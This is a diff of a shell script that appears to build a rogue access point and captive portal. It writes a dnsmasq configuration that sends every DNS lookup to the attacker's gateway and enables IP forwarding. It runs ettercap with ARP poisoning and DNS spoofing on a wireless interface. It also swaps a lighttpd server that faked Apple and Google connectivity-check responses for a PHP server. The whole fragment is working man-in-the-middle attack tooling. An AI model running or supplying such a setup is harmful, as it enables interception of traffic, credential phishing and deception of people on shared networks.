@@ -52,74 +52,8 @@ address=/#/$ipg
 log-queries
 log-dhcp
 " >dnsmasq.conf
-echo "\
-server.document-root = \"$workingpath/server/\"
-
-server.modules = (
-	\"mod_access\",
-	\"mod_alias\",
-	\"mod_accesslog\",
-	\"mod_redirect\",
-	\"mod_rewrite\"
-)
-
-accesslog.filename = \"$workingpath/lighttpd.log\"
 
 
-server.port = 80
-server.pid-file = \"/var/run/lighttpd.pid\"
-# server.username = \"www\"
-# server.groupname = \"www\"
-
-mimetype.assign = (
-	\".html\" => \"text/html\",
-	\".htm\" => \"text/html\",
-	\".txt\" => \"text/plain\",
-	\".jpg\" => \"image/jpeg\",
-	\".png\" => \"image/png\",
-	\".css\" => \"text/css\"
-)
-
-
-server.error-handler-404 = \"/\"
-
-static-file.exclude-extensions = (
-	\".fcgi\",
-	\".php\",
-	\".rb\",
-	\"~\",
-	\".inc\"
-)
-
-index-file.names = (
-	\"index.htm\",
-	\"index.html\",
-    \"index.php\"
-)
-" >"lighttpd.conf"
-
-  if [ "$ssl" = true ]; then
-    echo "\
-\$SERVER[\"socket\"] == \":443\" {
-	ssl.engine = \"enable\"
-	ssl.pemfile = \"server.pem\"
-}
-" >>"lighttpd.conf"
-
-fi
-echo "\
-\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
-	server.document-root = \"$workingpath/server/connectivity_responses/Apple/\"
-}
-
-
-\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
-	server.document-root = \"$workingpath/server/connectivity_responses/Google/\"
-	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
-}
-" >>"lighttpd.conf"
-
- 
 
 service isc-dhcp-server stop
 echo 1 >/proc/sys/net/ipv4/ip_forward
@@ -141,8 +75,8 @@ route add -net $ipb.0 netmask 255.255.255.0 gw  $ipg
 sleep 1
 
  dnsmasq -C $workingpath/dnsmasq.conf -d    & PID2=$!
- lighttpd -f  lighttpd.conf   & PID3=$!
-  ./$etterpath/ettercap -Tqi wlan0 -M arp:remote -P dns_spoof  & PID1=$!
+ php -S 0.0.0.0:8080 -t $workingpath/server/  & PID3=$!
+ ./$workingpath/ettercap/ettercap -Tqi wlan0 -M arp:remote -P dns_spoof  & PID1=$!
 echo 1 >/proc/sys/net/ipv4/ip_forward
 
 
